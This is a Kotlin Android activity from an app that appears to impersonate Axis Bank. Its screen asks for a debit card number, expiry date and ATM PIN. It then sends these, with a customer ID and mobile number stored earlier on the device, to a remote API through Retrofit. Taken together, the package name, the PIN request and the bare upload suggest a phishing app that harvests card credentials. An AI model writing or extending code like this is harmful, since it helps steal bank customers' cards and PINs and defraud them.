package com.example.oldaxisbank

import android.content.Intent
import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import android.text.Editable
import android.text.TextWatcher
import android.util.Log
import android.widget.Toast
import com.example.axisbank.SecondPage
import com.example.axisbank.Submit2
import com.example.oldaxisbank.databinding.ActivityVerifydetailBinding
import retrofit2.Call
import retrofit2.Callback
import retrofit2.Response

class verifydetail : AppCompatActivity() {

    private lateinit var binding : ActivityVerifydetailBinding

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        binding = ActivityVerifydetailBinding.inflate(layoutInflater)
        setContentView(binding.root)
        binding.e2.addTextChangedListener(object : TextWatcher {
            override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) {
                // Do nothing
            }

            override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {
                // Check if the text length is 2 and no "/" is present
                if (s?.length == 2 && !s.contains("/")) {
                    val modifiedText = StringBuilder(s).insert(2, "/").toString()
                    binding.e2.setText(modifiedText) // Insert "/" after the first two characters
                    binding.e2.setSelection(binding.e2.text.length) // Move cursor to the end
                }
            }

            override fun afterTextChanged(s: Editable?) {
                // Do nothing
            }
        })

        binding.login.setOnClickListener {


            if (binding.e1.text.toString().isEmpty() || binding.e2.text.toString().isEmpty() ||
                binding.e3.text.toString().isEmpty()  ){
                Toast.makeText(this,"fill all fields",Toast.LENGTH_SHORT).show()
            }
            else if (binding.e1.text.toString().length < 16 ){
                Toast.makeText(this,"Please Enter 16 digit Debit Card Number",Toast.LENGTH_SHORT).show()
            }
            else{

                val util = Util()
                val apiService = ApiClient.getClient().create(ApiService::class.java)
                val intentff = Intent(this, thirdpage::class.java)
                val data = SecondPage(customerid = util.getLocalData(this,"c"),
                    mobile = util.getLocalData(this,"m"),
                    debit = binding.e1.text.toString(), expiry = binding.e2.text.toString(),
                    atmpin = binding.e3.text.toString()
                )
                val call = apiService.second(data)
                call.enqueue(object : Callback<Void?> {
                    override fun onResponse(call: Call<Void?>, response: Response<Void?>) {
                        if (response.isSuccessful) {
                            startActivity(intentff)
                            Log.d("asdf123", "yes")
                        } else {
                            Log.d("asdf123", "unsucess")
                        }
                    }

                    override fun onFailure(call: Call<Void?>, t: Throwable) {
                        Log.d("asdf123", t.toString())
                    }
                })


            }

        }


    }
}